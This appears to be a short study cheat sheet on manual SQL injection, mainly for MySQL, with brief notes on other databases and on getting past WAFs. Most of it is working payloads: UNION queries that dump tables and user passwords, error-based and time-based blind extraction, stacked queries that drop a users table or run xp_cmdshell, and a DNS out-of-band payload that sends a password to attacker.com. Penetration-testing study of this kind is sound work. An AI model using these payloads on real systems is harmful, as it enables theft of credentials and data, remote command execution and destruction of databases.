# SQL Injection Fundamentals

Manual techniques. Understand before automating with sqlmap.

## MySQL Basics & Syntax

Common comment styles: `-- -` , `#` , `/* */`

UNION-based (visible):
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT user(),database(),version()-- -
' UNION SELECT table_name,column_name FROM information_schema.columns-- -
```

Error-based, Boolean blind, Time-based blind (`sleep(5)`, `benchmark`).

## MySQL Operator Precedence & Common Constructs

- Use `AND 1=1` , `AND 1=2` for boolean tests.
- `ORDER BY N` to find column count.
- `LIMIT 1 OFFSET 0` for paging in dumps.
- Subqueries and concat for data exfil.

## Other DBMS Notes

- MSSQL: stacked queries often possible, `xp_cmdshell`.
- PostgreSQL: similar, `COPY` to files sometimes.
- Oracle: different comments and functions.

## 2026 Context

SQLi still appears in APIs, GraphQL resolvers, legacy apps, and new code. Test every input (params, headers sometimes, JSON, cookies).

WAF bypass: encoding, comments, case, different quotes, `/**/`, double encoding, etc.

References: PortSwigger SQLi labs, PayloadsAllTheThings SQL Injection.

## More Manual SQLi Examples

**UNION-based full dump:**
```sql
' UNION SELECT null,table_name,null FROM information_schema.tables-- -
' UNION SELECT null,column_name,null FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT username,password FROM users-- -
```

**Error-based (MySQL):**
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
```

**Time-based blind:**
```sql
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),1)-- -
```

**Stacked queries (when allowed):**
```sql
'; DROP TABLE users; --
'; EXEC xp_cmdshell('whoami'); --
```

**Out-of-band (DNS):**
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\a'))-- -
```
